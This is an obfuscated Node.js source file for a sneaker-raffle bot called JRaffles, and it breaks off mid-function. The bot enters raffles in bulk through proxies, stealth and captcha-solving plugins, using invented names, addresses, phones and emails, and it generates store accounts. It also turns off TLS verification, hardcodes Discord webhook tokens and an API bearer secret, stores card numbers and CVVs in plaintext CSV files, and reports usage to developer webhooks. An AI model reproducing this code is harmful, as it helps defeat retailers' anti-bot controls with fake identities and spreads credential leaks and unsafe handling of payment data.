process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x241ca2 = require('fs'), _0x1d47c3 = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x4b57c1(_0x18a380) {
    const _0x5b8736 = _0x241ca2['createWriteStream'](_0x18a380, { 'flags': 'a' }), _0x7aa298 = console['log'];
    console['log'] = function () {
        const _0x5aff9c = Array['prototype']['slice']['call'](arguments), _0x518627 = _0x5aff9c['join']('\x20') + '\x0a';
        _0x5b8736['write'](_0x518627), _0x7aa298['apply'](console, _0x5aff9c);
    };
}
_0x4b57c1('../logs/log\x20' + _0x1d47c3);
var _0x1dca6d = require('tough-cookie'), _0x3451ed = require('node-imap'), _0x5bf8a9 = require('util')['inspect'];
const _0x34a37a = require('mailparser')['simpleParser'], { EmbedBuilder: _0x91cb32 } = require('discord.js');
var _0x28901b = require('exe');
const { execFile: _0x3e4cba } = require('child_process'), _0x3df2da = require('puppeteer-extra'), _0x371b3c = require('puppeteer-extra-plugin-recaptcha'), _0x6b6409 = require('puppeteer-extra-plugin-stealth'), _0x7ff36 = require('chalk'), _0x57fa03 = require('node-bash-title'), _0x8372f0 = require('axios'), _0x34efb8 = require('papaparse');
var _0x155ab9 = require('random-name');
const _0x5b6a7b = require('request');
var _0x8ec788 = require('prompt');
const _0x50eb26 = _0x5b6a7b['jar']();
var _0x15bf3f = {};
const _0x98a3ad = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0xd2a8b3 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x41edfd = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x49892b = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x3e4c73 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x515cc7 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x53d5ae = 'https://discord.com/api/webhooks/', _0x2d1e92 = '' + _0x53d5ae + _0x41edfd, _0x14c79a = '' + _0x53d5ae + _0x49892b, _0x4ebf40 = '' + _0x53d5ae + _0x98a3ad, _0x3ce78e = '' + _0x53d5ae + _0xd2a8b3, _0xd6338c = '' + _0x53d5ae + _0x3e4c73, _0x378e8b = '' + _0x53d5ae + _0x515cc7;
const _0x4c32f8 = JSON['parse'](_0x241ca2['readFileSync']('../package.json', 'utf-8')), _0x2bd99c = _0x4c32f8['version'];
var _0x5b46f0, _0x519e9c, _0x195cc1, _0x1c7c92, _0x253258, _0x2cc9cc, _0x6362be, _0x3ed90e;
const _0x4719eb = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x4311df = ![];
const _0x27b3e4 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x4110d4 = '0123456789';
var _0x57fada = _0x27b3e4['split']('');
const _0x23c443 = require('auto-git-update'), { PageEmittedEvents: _0x48dac0 } = require('puppeteer'), { getRandomValues: _0x2d4233 } = require('crypto'), { resolve: _0x39b62e } = require('path'), { Console: _0x20bc9d } = require('console'), _0x284649 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x2632e6 = new _0x23c443(_0x284649);
async function _0x2ce21f() {
    _0x253258 = _0x241ca2['readdirSync']('../proxies'), _0x1c7c92 = _0x241ca2['readdirSync']('../tasks'), !_0x241ca2['existsSync']('../accounts/fenom.csv') && _0x241ca2['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x241ca2['existsSync']('../accounts/bstn.csv') && _0x241ca2['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x241ca2['existsSync']('../accounts/eql.csv') && _0x241ca2['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x241ca2['existsSync']('../failed-tasks.csv') && _0x241ca2['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x241ca2['existsSync']('../successful-tasks.csv') && _0x241ca2['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x15bf3f = JSON['parse'](_0x241ca2['readFileSync']('../settings.json', 'utf-8')), !_0x15bf3f['delay'] && (_0x15bf3f['delay'] = 0x3c, _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), !_0x15bf3f['masterMail'] && (_0x15bf3f['masterMail'] = 'yourmail@gmail.com', _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), !_0x15bf3f['masterPassword'] && (_0x15bf3f['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), !_0x15bf3f['captchaKey'] && (_0x15bf3f['captchaKey'] = '', _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), !_0x15bf3f['useRandomProxy'] && (_0x15bf3f['useRandomProxy'] = !![], _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), !_0x15bf3f['shuffleTasks'] && (_0x15bf3f['shuffleTasks'] = ![], _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), !_0x15bf3f['webhook'] && (_0x15bf3f['webhook'] = '', _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), _0x15bf3f['delay'] <= 0x1388 && (_0x15bf3f['delay'] = _0x15bf3f['delay'] * 0x3e8), _0x15bf3f['AfewDelay'] && (delete _0x15bf3f['AfewDelay'], _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), _0x15bf3f['MahaDelay'] && (delete _0x15bf3f['MahaDelay'], _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), _0x15bf3f['footshopDelay'] && (delete _0x15bf3f['footshopDelay'], _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f, null, 0x2))), _0x15bf3f['MahaDelay'] = _0x15bf3f['delay'], _0x53d5ae = _0x15bf3f['webhook'], _0x2cc9cc = _0x15bf3f['licenseKey'];
}
let _0x5ae5d5, _0xd87547 = [], _0x2724dc;
const _0x37731a = _0x4813f6 => new Promise(_0xccaaf6 => setTimeout(_0xccaaf6, _0x4813f6));
function _0x413f8d(_0x2cd4b1, _0x101c00) {
    return Math['floor'](Math['random']() * (_0x101c00 - _0x2cd4b1 + 0x1) + _0x2cd4b1);
}
function _0x123107(_0x5b2a44) {
    let _0x19b08a = _0x5b2a44['length'], _0x3cfb08;
    while (_0x19b08a != 0x0) {
        _0x3cfb08 = Math['floor'](Math['random']() * _0x19b08a), _0x19b08a--, [_0x5b2a44[_0x19b08a], _0x5b2a44[_0x3cfb08]] = [
            _0x5b2a44[_0x3cfb08],
            _0x5b2a44[_0x19b08a]
        ];
    }
    return _0x5b2a44;
}
async function _0x35a848(_0x2b2eff) {
    return _0x8372f0['get']('https://api.hyper.co/v4/licenses/' + _0x2b2eff, { 'headers': { 'Authorization': 'Bearer\x20' + _0x4719eb } })['then'](_0x1dd360 => _0x1dd360['data'])['catch'](() => null);
}
;
async function _0x1c7a60(_0x3afcb0) {
    console['clear']();
    if (_0x3afcb0 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x462d30 = await _0x8ec788['get']('License');
        if (_0x462d30['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x37731a(0xbb8), _0x1c7a60(_0x3afcb0);
        _0x3afcb0 = _0x462d30['License'], _0x15bf3f['licenseKey'] = _0x3afcb0, _0x2cc9cc = _0x3afcb0, _0x241ca2['writeFileSync']('../settings.json', JSON['stringify'](_0x15bf3f));
    }
    console['log']('Checking\x20license\x20' + _0x2cc9cc + '...'), await _0x37731a(0x320);
    const _0x29e378 = await _0x35a848(_0x3afcb0);
    _0x6362be = JSON['stringify'](_0x29e378['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x3ed90e = JSON['stringify'](_0x29e378['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x29e378)
        return console['log']('License\x20not\x20found');
    if (!_0x29e378['user'])
        return console['log']('License\x20not\x20bound');
    return _0x29e378['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x4311df = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x4311df = ![]);
}
async function _0x32e666() {
    var _0x5d8ca4 = await _0x8ec788['get']('Module');
    return console['clear'](), _0x5d8ca4['Module'];
}
;
async function _0x2c85fa() {
    var _0x54beea = await _0x8ec788['get']('Setting');
    return console['clear'](), _0x54beea['Setting'];
}
async function _0x6dcdec() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x214f48 = 0x0; _0x214f48 < _0x1c7c92['length']; _0x214f48++) {
        console['log']('\x20(' + _0x214f48 + ')\x20' + _0x1c7c92[_0x214f48]);
    }
    console['log']('');
    var _0x444241 = await _0x8ec788['get']('Task');
    if (_0x444241['Task'] > _0x1c7c92['length'] - 0x1 || isNaN(_0x444241['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x37731a(0x3e8), _0x6dcdec();
    var _0x312787 = _0x241ca2['readFileSync']('../tasks/' + _0x1c7c92[_0x444241['Task']], 'utf-8');
    return _0x195cc1 = _0x34efb8['parse'](_0x312787, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x7ff36['blue'](_0x1c7c92[_0x444241['Task']])), _0x5b46f0 = _0x1c7c92[_0x444241['Task']], _0x195cc1;
}
async function _0x24911e() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x57683c = 0x0; _0x57683c < _0x253258['length']; _0x57683c++) {
        console['log']('\x20(' + _0x57683c + ')\x20' + _0x253258[_0x57683c]);
    }
    console['log']('');
    var _0x3be934 = await _0x8ec788['get']('Proxies');
    if (_0x3be934['Proxies'] > _0x253258['length'] - 0x1 || isNaN(_0x3be934['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x37731a(0x3e8), _0x24911e();
    var _0x5ea065 = _0x241ca2['readFileSync']('../proxies/' + _0x253258[_0x3be934['Proxies']], 'utf-8')['split']('\x0a');
    let _0x424350 = _0x5ea065['map']((_0x4d0625, _0x6808bc) => {
        sanatizeProxy = _0x4d0625['replace']('\x0d', '');
        if (_0x5ea065[_0x6808bc + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x519e9c = _0x253258[_0x3be934['Proxies']], console['clear'](), _0x424350;
}
async function _0x1b05fa() {
    var _0x154f71 = await _0x8ec788['get']('Value');
    return console['clear'](), _0x154f71['Value'];
}
async function _0x17591d(_0xf5ed67) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x588a30 = 0x0; _0x588a30 < _0xf5ed67['length']; _0x588a30++) {
        console['log']('\x20(' + _0x588a30 + ')\x20[' + _0xf5ed67[_0x588a30]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x503a18 = await _0x8ec788['get']('Module');
    return _0x503a18['Module'];
}
async function _0x5c93fb() {
    var _0x540ec4 = await _0x8ec788['get']('Password');
    return console['clear'](), _0x540ec4['Password'];
}
;
async function _0x1cd3cb() {
    var _0x1e804c = await _0x8ec788['get']('Links');
    return _0x1e804c['Links'];
}
;
async function _0x42f916() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x50c2a8 = 0x0; _0x50c2a8 < _0xd87547['length']; _0x50c2a8++) {
        console['log']('\x20(' + _0x50c2a8 + ')\x20' + _0xd87547[_0x50c2a8]);
    }
    ;
    console['log']();
    let _0x17719c = await _0x8ec788['get']('Product');
    return console['clear'](), _0x17719c['Product'];
}
;
function _0x1c7496() {
    var _0x49bf47 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x49bf47;
}
;
function _0x262fe4() {
    var _0x4d3abd = new Date(Date['now']())['toLocaleString']();
    return _0x4d3abd['replace'](',', '');
}
async function _0x4160b0(_0x21c455, _0x2d759a) {
    let _0x4aa9e0 = { 'headers': { 'content-type': 'application/json' } };
    if (_0x2bd99c != 'devkey') {
        await _0x8372f0['post'](_0x21c455, _0x2d759a, _0x4aa9e0);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x5c5001(_0x126cac, _0x12d621, _0x4805a5, _0x3e6b69, _0x2f9dff) {
    if (!_0x3e6b69 && _0x4805a5 == 'dev') {
        var _0x4e77c1 = new _0x91cb32()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x12d621['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x12d621['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x126cac['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x15bf3f['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x6362be,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x126cac['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x126cac['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x2bd99c,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x4e77c1['data'];
    } else {
        if (_0x3e6b69 && _0x4805a5 == 'dev') {
            var _0x4e77c1 = new _0x91cb32()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x12d621['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x6362be,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x12d621['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x126cac['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x15bf3f['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x2f9dff,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x126cac['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x126cac['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x2bd99c,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x4e77c1['data'];
        } else {
            if (_0x4805a5 == 'pub') {
                var _0x4e77c1 = new _0x91cb32()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x12d621['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x12d621['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x126cac['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x15bf3f['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x126cac['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x2bd99c,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x4e77c1['data'];
            } else {
                if (_0x4805a5 == 'acc' && !_0x3e6b69) {
                    var _0x4e77c1 = new _0x91cb32()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x12d621['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x6362be,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x12d621['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x15bf3f['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x2bd99c,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x4e77c1['data'];
                } else {
                    if (_0x4805a5 == 'acc' && _0x3e6b69) {
                        var _0x4e77c1 = new _0x91cb32()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x12d621['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x6362be,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0x2f9dff,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x12d621['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x15bf3f['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x2bd99c,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x4e77c1['data'];
                    } else {
                        if (_0x4805a5 == 'open') {
                            var _0x4e77c1 = new _0x91cb32()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x3ed90e)['addFields']({
                                'name': 'User',
                                'value': '' + _0x6362be,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x2bd99c,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x4e77c1['data'];
                        } else {
                            if (!_0x3e6b69 && _0x4805a5 == 'ver') {
                                var _0x4e77c1 = new _0x91cb32()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x12d621['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x6362be,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x12d621['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x15bf3f['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x2bd99c,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x4e77c1['data'];
                            } else {
                                if (_0x3e6b69 && _0x4805a5 == 'ver') {
                                    var _0x4e77c1 = new _0x91cb32()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x12d621['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x6362be,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0x2f9dff,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x12d621['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x15bf3f['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x2bd99c,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x4e77c1['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x412246(_0x105734, _0x4ac1fb) {
    var _0x44d755 = _0x105734[_0x4ac1fb]['Address1']['split'](''), _0x54d83b = _0x105734[_0x4ac1fb]['Address2']['split'](''), _0x5b48b1 = _0x105734[_0x4ac1fb]['Email']['split']('@');
    for (var _0x4a981b = 0x0; _0x4a981b < _0x44d755['length']; _0x4a981b++) {
        if (_0x44d755[_0x4a981b] == 'X') {
            var _0x2717e2 = Math['round'](Math['random']() * (_0x27b3e4['length'] - 0x1));
            _0x44d755[_0x4a981b] = _0x57fada[_0x2717e2];
        }
    }
    ;
    for (var _0x4a981b = 0x0; _0x4a981b < _0x54d83b['length']; _0x4a981b++) {
        if (_0x54d83b[_0x4a981b] == 'X') {
            var _0x2717e2 = Math['round'](Math['random']() * (_0x27b3e4['length'] - 0x1));
            _0x54d83b[_0x4a981b] = _0x57fada[_0x2717e2];
        }
    }
    ;
    _0x105734[_0x4ac1fb]['FirstName'] == 'RANDOM' && (_0x105734[_0x4ac1fb]['FirstName'] = _0x155ab9['first']());
    _0x105734[_0x4ac1fb]['LastName'] == 'RANDOM' && (_0x105734[_0x4ac1fb]['LastName'] = _0x155ab9['last']());
    _0x5b48b1[0x0] == 'RANDOM' ? _0x5b48b1[0x0] = '' + _0x155ab9['first']() + _0x155ab9['last']() + _0x413f8d(0x1, 0x270f) + '@' : _0x5b48b1[0x0] = _0x5b48b1[0x0] + '@';
    _0x105734[_0x4ac1fb]['Email'] = _0x5b48b1['join'](''), _0x105734[_0x4ac1fb]['Address1'] = _0x44d755['join'](''), _0x105734[_0x4ac1fb]['Address2'] = _0x54d83b['join']('');
    _0x105734[_0x4ac1fb]['Phone'] == 'RANDOM' && (_0x105734[_0x4ac1fb]['Phone'] = '0' + _0x413f8d(0x5f5e100, 0x3b9ac9ff));
    if (_0x105734[_0x4ac1fb]['Follower'] == 'RANDOM') {
        var _0x2179d9 = _0x413f8d(0x1, 0x270f);
        _0x105734[_0x4ac1fb]['Follower'] = '' + _0x155ab9['first']() + _0x155ab9['last']() + _0x2179d9 + '\x20';
    }
    _0x105734[_0x4ac1fb]['HouseNumber'] == 'RANDOM' && (_0x105734[_0x4ac1fb]['HouseNumber'] = _0x413f8d(0x1, 0xc8));
    if (_0x105734[_0x4ac1fb]['Address1'] == 'RANDOM') {
        var _0x2214f1 = Math['round'](Math['random']() * (_0x27b3e4['length'] - 0x1)), _0x4bff55 = _0x57fada[_0x2214f1];
        _0x105734[_0x4ac1fb]['Address1'] = _0x155ab9['last']() + 'straat', _0x105734[_0x4ac1fb]['Zip'] == '' && (_0x105734[_0x4ac1fb]['Postcode'] = _0x413f8d(0x3e8, 0x270f) + '\x20' + _0x4bff55 + _0x4bff55, _0x105734[_0x4ac1fb]['Zip'] = _0x105734[_0x4ac1fb]['Postcode']), _0x105734[_0x4ac1fb]['HouseNumber'] = '' + _0x413f8d(0x1, 0xc8);
    }
    return;
}
;
async function _0x17fcb0(_0x4a62e6, _0x28087a) {
    _0x241ca2['appendFileSync']('../failed-tasks.csv', _0x262fe4() + ',' + _0x28087a['store'] + ',' + _0x28087a['name'] + ',' + _0x4a62e6['Url'] + ',' + _0x4a62e6['Size'] + ',' + _0x4a62e6['Follower'] + ',' + _0x4a62e6['FirstName'] + ',' + _0x4a62e6['LastName'] + ',' + _0x4a62e6['Address1'] + ',' + _0x4a62e6['Address2'] + ',' + _0x4a62e6['HouseNumber'] + ',' + _0x4a62e6['Zip'] + ',' + _0x4a62e6['City'] + ',' + _0x4a62e6['State'] + ',' + _0x4a62e6['Country'] + ',' + _0x4a62e6['Phone'] + ',' + _0x4a62e6['Email'] + ',' + _0x4a62e6['Password'] + ',' + _0x4a62e6['PaymentMethod'] + ',' + _0x4a62e6['CardType'] + ',' + _0x4a62e6['NameOnCard'] + ',' + _0x4a62e6['CardNumber'] + ',' + _0x4a62e6['ExpiryDate'] + ',' + _0x4a62e6['CVV'] + ',' + _0x4a62e6['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x5879e0(_0x53a6d1, _0x9d51cd) {
    _0x241ca2['appendFileSync']('../successful-tasks.csv', _0x262fe4() + ',' + _0x9d51cd['store'] + ',' + _0x9d51cd['name'] + ',' + _0x53a6d1['Url'] + ',' + _0x53a6d1['Size'] + ',' + _0x53a6d1['Follower'] + ',' + _0x53a6d1['FirstName'] + ',' + _0x53a6d1['LastName'] + ',' + _0x53a6d1['Address1'] + ',' + _0x53a6d1['Address2'] + ',' + _0x53a6d1['HouseNumber'] + ',' + _0x53a6d1['Zip'] + ',' + _0x53a6d1['City'] + ',' + _0x53a6d1['State'] + ',' + _0x53a6d1['Country'] + ',' + _0x53a6d1['Phone'] + ',' + _0x53a6d1['Email'] + ',' + _0x53a6d1['Password'] + ',' + _0x53a6d1['PaymentMethod'] + ',' + _0x53a6d1['CardType'] + ',' + _0x53a6d1['NameOnCard'] + ',' + _0x53a6d1['CardNumber'] + ',' + _0x53a6d1['ExpiryDate'] + ',' + _0x53a6d1['CVV'] + ',' + _0x53a6d1['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0xaf207c() {
    let _0x44c7a5 = proxyFile['split']('\x0a'), _0x4746cd = _0x44c7a5['map']((_0x1e75bb, _0x52f1a5) => {
        sanatizeProxy = _0x1e75bb['replace']('\x0d', '');
        if (_0x44c7a5[_0x52f1a5 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x4746cd;
}
;
async function _0x43d730(_0xa455dc) {
    var _0x491aac = _0xa455dc[0x1]['split'](':');
    const _0x23ccf7 = await _0x3df2da['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x491aac[0x0] + ':' + _0x491aac[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x364d64 = await _0x23ccf7['newPage']();
        await _0x364d64['authenticate']({
            'username': '' + _0x491aac[0x2],
            'password': '' + _0x491aac[0x3]
        }), console['log'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x364d64['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x364d64['setRequestInterception'](!![]), _0x364d64['on']('request', _0x572195 => {
            _0x572195['resourceType']() === 'image' || _0x572195['resourceType']() === 'font' || _0x572195['resourceType']() === 'media' ? _0x572195['abort']() : _0x572195['continue']();
        }), await _0x364d64['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x1c7496() + '\x20[' + _0x306e17[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x364d64['waitForTimeout'](0xbb8), await _0x364d64['waitForSelector']('.product-card');
        const _0x16e3b6 = await _0x364d64['$$eval']('a.product-card', _0x60a3da => {
